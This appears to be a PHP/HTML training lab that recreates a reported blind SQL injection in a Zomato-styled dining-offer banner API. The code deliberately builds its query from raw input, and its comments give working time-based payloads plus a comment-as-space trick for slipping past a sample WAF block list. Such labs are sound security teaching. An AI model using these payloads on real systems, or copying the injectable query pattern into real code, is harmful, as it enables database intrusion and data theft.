<?php
// ============================================================
// SQL Injection Lab 121 — Blind SQLi via CASE WHEN + /**/ WAF Bypass
// Platform: Zomato Dining-Out Banner API
// HackerOne Report #838855 ($2,000 bounty, Critical)
// Endpoint: POST /php/geto2banner
// Injection point: `res_id` POST param (integer) + city_id
//
// The exact payload from the report:
//   res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0
//
// WAF blocks:  CASE[space]WHEN,  AND SLEEP(,  OR SLEEP(
// /**/ bypass: CASE/**/WHEN bypasses space-check → sleep() executes
//
// Burp Repeater attack:
//   res_id=51-CASE WHEN(1=1)THEN(SLEEP(5))END → WAF BLOCK (space after CASE)
//   res_id=51-CASE/**/WHEN(1=1)THEN(SLEEP(5))END  → ~5s  ← confirmed SQLi!
//   res_id=51-CASE/**/WHEN(1=2)THEN(SLEEP(5))END  → instant (FALSE branch)
//   res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(5))END → conditional
// ============================================================

$server   = (getenv('DB_HOST') ?: (file_exists('/.dockerenv') ? 'krazeplanet' : '127.0.0.1'));
$username = "root";
$password = "";
$database = "KrazePlanet_DB";

$conn = mysqli_connect($server, $username, $password);
if (!$conn) die(json_encode(["success" => false, "error" => "DB error"]));
mysqli_query($conn, "CREATE DATABASE IF NOT EXISTS $database");
mysqli_select_db($conn, $database);

function initializeLab121Database($conn) {
    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab121_banners (
        id              INT AUTO_INCREMENT PRIMARY KEY,
        res_id          INT NOT NULL,
        city_id         INT NOT NULL DEFAULT 0,
        restaurant_name VARCHAR(100) NOT NULL,
        banner_text     VARCHAR(255) NOT NULL,
        discount_pct    INT NOT NULL DEFAULT 0,
        offer_code      VARCHAR(20)  NOT NULL DEFAULT '',
        UNIQUE KEY uk_res (res_id)
    )");
    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab121_secret (
        id          INT AUTO_INCREMENT PRIMARY KEY,
        secret_data VARCHAR(100) NOT NULL
    )");
    $chkS = mysqli_query($conn, "SELECT * FROM lab121_secret LIMIT 1");
    if (mysqli_num_rows($chkS) == 0) {
        mysqli_query($conn, "INSERT INTO lab121_secret (secret_data) VALUES ('flag{zomato_o2banner_sqli_838855}')");
    }
    $chkB = mysqli_query($conn, "SELECT COUNT(*) AS c FROM lab121_banners");
    $r = mysqli_fetch_assoc($chkB);
    if ((int)$r['c'] === 0) {
        // Only 1 row ensures SLEEP() in CASE/**/WHEN evaluates exactly once
        // (MySQL per-row evaluation of non-deterministic expressions would
        // multiply the delay by the row count otherwise)
        mysqli_query($conn, "INSERT INTO lab121_banners (res_id, city_id, restaurant_name, banner_text, discount_pct, offer_code) VALUES
            (51, 8, 'Pizza Palace', 'Flat 20% off on all dine-in orders above ₹500. Valid Mon–Thu.', 20, 'DINE20')");
    }
}
initializeLab121Database($conn);

// ============================================================
// Simulated WAF — blocks space-based injection patterns
// Allows /**/ comment-as-space bypass (report #838855 technique)
// ============================================================
function wafCheck($input) {
    $patterns = [
        "/CASE\s+WHEN/i",         // CASE[whitespace]WHEN  — blocked
        "/AND\s+SLEEP\s*\(/i",    // AND SLEEP(           — blocked
        "/OR\s+SLEEP\s*\(/i",     // OR SLEEP(            — blocked
        "/' OR /i",               // ' OR                 — blocked
        "/' AND /i",              // ' AND                — blocked
        "/UNION\s+SELECT/i",      // UNION SELECT         — blocked
    ];
    foreach ($patterns as $p) {
        if (preg_match($p, $input)) return true;
    }
    return false;
}

// ============================================================
// API Route — POST with res_id → JSON banner response
// ============================================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && array_key_exists('res_id', $_POST)) {
    header('Content-Type: application/json; charset=utf-8');
    header('X-Powered-By: ZomatoAPI/2.0');

    $res_id  = $_POST['res_id']  ?? '';
    $city_id = $_POST['city_id'] ?? '0';

    if (wafCheck((string)$res_id) || wafCheck((string)$city_id)) {
        http_response_code(403);
        echo json_encode([
            "success" => false,
            "error"   => "Request blocked by security filter",
            "code"    => "WAF_VIOLATION"
        ]);
        exit;
    }

    // ====================================================================
    // ⚠ VULNERABLE — res_id is INTEGER injected raw into WHERE clause
    //
    //   Normal:  WHERE res_id = 51 AND city_id = 8
    //
    //   Bypass:  res_id=51-CASE/**/WHEN(1=1)THEN(SLEEP(5))END
    //   SQL:     WHERE res_id = 51-CASE/**/WHEN(1=1)THEN(SLEEP(5))END AND city_id = 8
    //   → MySQL evaluates SLEEP(5) → 5s response delay
    //   → 51-0 = 51 → query finds the restaurant (same response, just delayed)
    //
    //   Conditional:
    //   res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(5))END
    //   → if version() length IS 10 → 5s delay (TRUE)
    //   → if version() length NOT 10 → instant (FALSE)
    // ====================================================================
    // city_id kept in POST body for realism; res_id UNIQUE index makes MySQL evaluate
    // the CASE WHEN expression once (index seek), giving a clean 1:1 sleep delay.
    $sql    = "SELECT res_id, restaurant_name, banner_text, discount_pct, offer_code
               FROM lab121_banners
               WHERE res_id = $res_id";
    $result = mysqli_query($conn, $sql);

    if ($result === false) {
        http_response_code(500);
        echo json_encode([
            "success" => false,
            "error"   => "Internal Server Error",
            "sqlstate" => mysqli_sqlstate($conn),
            "message" => mysqli_error($conn)
        ]);
        exit;
    }

    $row = mysqli_fetch_assoc($result);
    if ($row) {
        echo json_encode(["success" => true,  "banner" => $row]);
    } else {
        echo json_encode(["success" => false, "error"  => "No banner found for this restaurant"]);
    }
    exit;
}

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pizza Palace, New Delhi - Order Online | Zomato</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;color:#1C1C1C;font-size:14px;}

/* ── Header ──────────────────────────────────────────────────────────────── */
.z-header{background:#E23744;padding:0;position:sticky;top:0;z-index:100;box-shadow:0 2px 8px rgba(0,0,0,.25);}
.z-header-inner{display:flex;align-items:center;gap:12px;padding:0 24px;height:56px;max-width:1280px;margin:0 auto;}
.z-logo{display:flex;align-items:center;gap:6px;text-decoration:none;flex-shrink:0;}
.z-logo-mark{width:28px;height:28px;background:#fff;border-radius:4px;display:flex;align-items:center;justify-content:center;}
.z-logo-mark span{font-size:1.1rem;font-weight:900;color:#E23744;line-height:1;}
.z-logo-text{font-size:1.15rem;font-weight:800;color:#fff;letter-spacing:.01em;}
.z-search{flex:1;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.25);border-radius:6px;display:flex;align-items:center;padding:6px 12px;gap:6px;max-width:540px;}
.z-search svg{width:15px;height:15px;fill:none;stroke:rgba(255,255,255,.6);stroke-width:2;flex-shrink:0;}
.z-search input{background:none;border:none;outline:none;font-size:.82rem;color:#fff;width:100%;font-family:inherit;}
.z-search input::placeholder{color:rgba(255,255,255,.55);}
.z-nav-right{margin-left:auto;display:flex;align-items:center;gap:8px;}
.z-btn{font-size:.75rem;font-weight:700;padding:6px 14px;border-radius:5px;cursor:pointer;border:none;font-family:inherit;white-space:nowrap;}
.z-btn-login{background:rgba(255,255,255,.15);color:#fff;border:1px solid rgba(255,255,255,.4);}
.z-btn-signup{background:#fff;color:#E23744;}
.z-btn:hover{opacity:.88;}

/* ── Breadcrumb ──────────────────────────────────────────────────────────── */
.z-breadcrumb{background:#fff;border-bottom:1px solid #f0f0f0;padding:8px 24px;font-size:.72rem;color:#9D9D9D;max-width:1280px;margin:0 auto;}
.z-breadcrumb a{color:#9D9D9D;text-decoration:none;}.z-breadcrumb a:hover{color:#E23744;}
.z-breadcrumb span{margin:0 4px;}

/* ── Restaurant Hero ─────────────────────────────────────────────────────── */
.z-restaurant-wrap{max-width:1280px;margin:0 auto;padding:0 24px;}
.z-restaurant-hero{display:grid;grid-template-columns:1fr 260px;gap:16px;padding:20px 0 0;}
.z-res-info{}
.z-res-header{display:flex;align-items:flex-start;gap:14px;margin-bottom:12px;}
.z-res-thumb{width:72px;height:72px;background:linear-gradient(135deg,#ff9a9e,#fecfef);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:1.8rem;flex-shrink:0;border:2px solid #f0f0f0;}
.z-res-name{font-size:1.5rem;font-weight:800;color:#1C1C1C;line-height:1.2;margin-bottom:4px;}
.z-res-meta{font-size:.78rem;color:#6B6B6B;display:flex;gap:10px;flex-wrap:wrap;align-items:center;}
.z-badge{background:#f0f0f0;border-radius:3px;padding:2px 7px;font-size:.68rem;font-weight:600;color:#6B6B6B;}
.z-rating{background:#3D9B6D;color:#fff;border-radius:4px;padding:3px 8px;font-size:.75rem;font-weight:700;display:inline-flex;align-items:center;gap:3px;}
.z-rating svg{width:10px;height:10px;fill:#fff;}
.z-votes{font-size:.7rem;color:#9D9D9D;margin-left:4px;}

/* ── Tab strip ───────────────────────────────────────────────────────────── */
.z-tabs{display:flex;border-bottom:2px solid #f0f0f0;margin:16px 0 0;}
.z-tab{padding:10px 18px;font-size:.82rem;font-weight:600;color:#9D9D9D;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-2px;white-space:nowrap;}
.z-tab.active{color:#E23744;border-bottom-color:#E23744;}
.z-tab:hover:not(.active){color:#1C1C1C;}

/* ── Dining Out Section ──────────────────────────────────────────────────── */
.z-section{padding:16px 0;}
.z-section-title{font-size:.78rem;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#9D9D9D;margin-bottom:12px;}

/* ── Offer Card ──────────────────────────────────────────────────────────── */
.z-offer-card{background:#fff;border:1px solid #f0f0f0;border-radius:10px;padding:14px 16px;display:flex;align-items:center;gap:14px;margin-bottom:10px;box-shadow:0 1px 4px rgba(0,0,0,.05);}
.z-offer-icon{width:44px;height:44px;background:#FFF0F1;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:1.3rem;}
.z-offer-text{flex:1;}
.z-offer-title{font-size:.85rem;font-weight:700;color:#1C1C1C;margin-bottom:2px;}
.z-offer-sub{font-size:.72rem;color:#9D9D9D;}
.z-offer-pct{font-size:1.1rem;font-weight:800;color:#E23744;white-space:nowrap;margin-right:6px;}
.btn-view-offers{background:#E23744;color:#fff;border:none;border-radius:6px;padding:8px 18px;font-size:.78rem;font-weight:700;cursor:pointer;font-family:inherit;display:inline-flex;align-items:center;gap:5px;transition:background .15s;white-space:nowrap;}
.btn-view-offers:hover{background:#c8313d;}
.btn-view-offers svg{width:14px;height:14px;fill:none;stroke:#fff;stroke-width:2.5;}

/* ── Sidebar card ────────────────────────────────────────────────────────── */
.z-res-sidebar{background:#fff;border:1px solid #f0f0f0;border-radius:10px;padding:14px;height:fit-content;box-shadow:0 1px 4px rgba(0,0,0,.05);}
.z-sidebar-title{font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:#9D9D9D;margin-bottom:10px;}
.z-info-row{display:flex;align-items:flex-start;gap:8px;margin-bottom:9px;font-size:.78rem;}
.z-info-row svg{width:14px;height:14px;fill:none;stroke:#9D9D9D;stroke-width:2;flex-shrink:0;margin-top:1px;}
.z-info-label{color:#6B6B6B;}
.z-info-val{color:#1C1C1C;font-weight:600;}

/* ── Banner Modal ────────────────────────────────────────────────────────── */
.z-modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:999;align-items:center;justify-content:center;}
.z-modal-bg.show{display:flex;}
.z-modal{background:#fff;border-radius:14px;width:420px;max-width:92vw;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.3);}
.z-modal-header{background:#E23744;padding:16px 18px;display:flex;justify-content:space-between;align-items:center;}
.z-modal-title{font-size:.9rem;font-weight:800;color:#fff;}
.z-modal-close{background:none;border:none;color:rgba(255,255,255,.75);font-size:1.2rem;cursor:pointer;line-height:1;padding:0;}
.z-modal-close:hover{color:#fff;}
.z-modal-body{padding:18px;}
.z-banner-code{font-size:1.3rem;font-weight:900;color:#E23744;font-family:monospace;letter-spacing:.08em;}
.z-banner-text{font-size:.85rem;color:#1C1C1C;margin:8px 0 12px;line-height:1.5;}
.z-banner-tag{display:inline-block;background:#FFF0F1;color:#E23744;font-size:.7rem;font-weight:700;padding:3px 9px;border-radius:4px;border:1px solid #ffd0d3;}
.z-banner-loading{text-align:center;padding:20px;color:#9D9D9D;font-size:.82rem;}
.z-banner-error{background:#FFF5F5;border:1px solid #ffd0d3;border-radius:6px;padding:10px 12px;font-size:.78rem;color:#E23744;}

/* ── O2 promo strip ──────────────────────────────────────────────────────── */
.z-o2-strip{background:linear-gradient(90deg,#ff6b6b,#E23744);border-radius:8px;padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:12px;margin:12px 0;}
.z-o2-text{color:#fff;}
.z-o2-title{font-size:.85rem;font-weight:800;}
.z-o2-sub{font-size:.68rem;opacity:.8;margin-top:1px;}
.z-o2-btn{background:#fff;color:#E23744;border:none;border-radius:5px;padding:6px 12px;font-size:.72rem;font-weight:800;cursor:pointer;font-family:inherit;white-space:nowrap;}
.z-o2-btn:hover{opacity:.9;}

/* ── Footer ──────────────────────────────────────────────────────────────── */
.z-footer{background:#1C1C1C;color:#6B6B6B;font-size:.7rem;padding:14px 24px;margin-top:30px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:6px;}
.z-footer a{color:#6B6B6B;text-decoration:none;}.z-footer a:hover{color:#E23744;}
</style>
</head>
<body>

<!-- Header -->
<header class="z-header">
  <div class="z-header-inner">
    <a class="z-logo" href="#">
      <div class="z-logo-mark"><span>z</span></div>
      <span class="z-logo-text">zomato</span>
    </a>
    <div class="z-search">
      <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
      <input type="text" placeholder='Search for restaurant, cuisine or a dish' value="New Delhi">
    </div>
    <div class="z-nav-right">
      <button class="z-btn z-btn-login">Log in</button>
      <button class="z-btn z-btn-signup">Sign up</button>
    </div>
  </div>
</header>

<!-- Breadcrumb -->
<div class="z-breadcrumb">
  <a href="#">Home</a><span>›</span>
  <a href="#">New Delhi</a><span>›</span>
  <a href="#">Restaurants</a><span>›</span>
  <a href="#">Italian</a><span>›</span>
  Pizza Palace
</div>

<div class="z-restaurant-wrap">
<div class="z-restaurant-hero">

  <!-- Main Info -->
  <div class="z-res-info">
    <div class="z-res-header">
      <div class="z-res-thumb">🍕</div>
      <div>
        <div class="z-res-name">Pizza Palace</div>
        <div class="z-res-meta">
          <span class="z-rating">
            <svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
            4.3
          </span>
          <span class="z-votes">(2,456 ratings)</span>
          <span class="z-badge">Dining Out</span>
          <span class="z-badge">Delivery</span>
        </div>
        <div style="margin-top:6px;font-size:.78rem;color:#6B6B6B;">
          Italian, American · ₹₹₹ · New Delhi
        </div>
      </div>
    </div>

    <!-- Tab strip -->
    <div class="z-tabs">
      <div class="z-tab">Delivery</div>
      <div class="z-tab active">Dining Out</div>
      <div class="z-tab">Reviews</div>
      <div class="z-tab">Photos</div>
      <div class="z-tab">Menu</div>
    </div>

    <!-- Dining Out section -->
    <div class="z-section">
      <div class="z-section-title">Dining Out Offers</div>

      <!-- O2 Banner promo strip -->
      <div class="z-o2-strip">
        <div class="z-o2-text">
          <div class="z-o2-title">Zomato Gold Dining</div>
          <div class="z-o2-sub">Exclusive member offers at 1,000+ restaurants</div>
        </div>
        <button class="z-o2-btn" id="viewOffersBtn" onclick="fetchBanner()">View Offers ▶</button>
      </div>

      <!-- Offer preview card -->
      <div class="z-offer-card">
        <div class="z-offer-icon">🏷</div>
        <div class="z-offer-text">
          <div class="z-offer-title">Flat 20% Off on Dine-In</div>
          <div class="z-offer-sub">Valid Mon–Thu · Min order ₹500 · Zomato users only</div>
        </div>
        <span class="z-offer-pct">20%</span>
        <button class="btn-view-offers" onclick="fetchBanner()">
          <svg viewBox="0 0 24 24"><path d="M7 7h10v3l4-4-4-4v3H5v6h2V7zm10 10H7v-3l-4 4 4 4v-3h12v-6h-2v4z"/></svg>
          Get Code
        </button>
      </div>

      <div class="z-offer-card">
        <div class="z-offer-icon">🎁</div>
        <div class="z-offer-text">
          <div class="z-offer-title">Special Zomato Gold Combo</div>
          <div class="z-offer-sub">Applicable on Food + Beverages · Weekend special</div>
        </div>
        <button class="btn-view-offers" onclick="fetchBanner()" style="background:#9D9D9D;">
          <svg viewBox="0 0 24 24"><path d="M7 7h10v3l4-4-4-4v3H5v6h2V7zm10 10H7v-3l-4 4 4 4v-3h12v-6h-2v4z"/></svg>
          Get Code
        </button>
      </div>

      <p style="font-size:.7rem;color:#9D9D9D;margin-top:8px;">
        Offers fetched via <code style="background:#f5f5f5;padding:1px 4px;border-radius:2px;font-size:.68rem;">POST /php/geto2banner</code> · res_id=51 · city_id=8
      </p>
    </div>
  </div>

  <!-- Sidebar -->
  <div class="z-res-sidebar">
    <div class="z-sidebar-title">Restaurant Info</div>
    <div class="z-info-row"><svg viewBox="0 0 24 24"><path d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/><circle cx="12" cy="11" r="3"/></svg><div><div class="z-info-label">Address</div><div class="z-info-val">14B Connaught Place, New Delhi</div></div></div>
    <div class="z-info-row"><svg viewBox="0 0 24 24"><path d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg><div><div class="z-info-label">Hours</div><div class="z-info-val">11am – 11pm (Daily)</div></div></div>
    <div class="z-info-row"><svg viewBox="0 0 24 24"><path d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"/></svg><div><div class="z-info-label">Phone</div><div class="z-info-val">+91-11-4567-8900</div></div></div>
    <div class="z-info-row"><svg viewBox="0 0 24 24"><path d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg><div><div class="z-info-label">Cost for Two</div><div class="z-info-val">₹1,200</div></div></div>
    <hr style="border:none;border-top:1px solid #f0f0f0;margin:10px 0;">
    <div style="font-size:.68rem;color:#9D9D9D;line-height:1.5;">
      <strong style="color:#6B6B6B;">res_id:</strong> 51 &nbsp;|&nbsp; <strong style="color:#6B6B6B;">city_id:</strong> 8 (Delhi)
    </div>
  </div>

</div><!-- .z-restaurant-hero -->
</div><!-- .z-restaurant-wrap -->

<!-- Banner Modal -->
<div class="z-modal-bg" id="bannerModal">
  <div class="z-modal">
    <div class="z-modal-header">
      <span class="z-modal-title">🏷 Dine-Out Offer Code</span>
      <button class="z-modal-close" onclick="closeModal()">✕</button>
    </div>
    <div class="z-modal-body" id="bannerModalBody">
      <div class="z-banner-loading">Loading offer…</div>
    </div>
  </div>
</div>

<footer class="z-footer">
  <span>© 2020 Zomato Media Pvt. Ltd. | www.zomato.com</span>
  <span>
    <a href="https://hackerone.com/reports/838855" target="_blank" rel="noopener">HackerOne #838855</a>
    &nbsp;·&nbsp; Bounty: $2,000 (Critical)
  </span>
</footer>

<script>
function fetchBanner() {
    var modal = document.getElementById('bannerModal');
    var body  = document.getElementById('bannerModalBody');
    modal.classList.add('show');
    body.innerHTML = '<div class="z-banner-loading">Fetching offer from server…</div>';

    // ================================================================
    // ⚠ This POST request is the vulnerable one (students intercept in Burp)
    //
    // Simulates: POST /php/geto2banner HTTP/1.1
    //            Host: www.zomato.com
    //            Content-type: application/x-www-form-urlencoded
    //
    //            res_id=51&city_id=8
    //
    // Integer injection — no quotes needed. WAF blocks spaces:
    //   res_id=51-CASE WHEN(1=1)THEN(SLEEP(5))END  → WAF 403
    //   res_id=51-CASE/**/WHEN(1=1)THEN(SLEEP(5))END → ~5s delay ← confirmed
    //   res_id=51-CASE/**/WHEN(1=2)THEN(SLEEP(5))END → instant (FALSE)
    // ================================================================
    fetch('index.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'res_id=51&city_id=8'
    })
    .then(function(r){ return r.json(); })
    .then(function(data) {
        if (data.success && data.banner) {
            var b = data.banner;
            body.innerHTML =
                '<div style="margin-bottom:6px;font-size:.7rem;color:#9D9D9D;">OFFER CODE</div>' +
                '<div class="z-banner-code">' + esc(b.offer_code) + '</div>' +
                '<div class="z-banner-text">' + esc(b.banner_text) + '</div>' +
                (b.discount_pct > 0 ?
                    '<span class="z-banner-tag">' + esc(b.discount_pct) + '% OFF on Dine-In</span>' :
                    '<span class="z-banner-tag">Special Offer</span>'
                ) +
                '<div style="margin-top:12px;font-size:.68rem;color:#9D9D9D;">Valid at: ' + esc(b.restaurant_name) + '</div>';
        } else {
            body.innerHTML = '<div class="z-banner-error">' +
                (data.error || 'No offers currently available for this restaurant.') +
                '</div>';
        }
    })
    .catch(function() {
        body.innerHTML = '<div class="z-banner-error">Network error. Please try again.</div>';
    });
}

function closeModal() {
    document.getElementById('bannerModal').classList.remove('show');
}
document.getElementById('bannerModal').addEventListener('click', function(e) {
    if (e.target === this) closeModal();
});

function esc(s) {
    var d = document.createElement('div');
    d.textContent = String(s);
    return d.innerHTML;
}
</script>

</body>
</html>
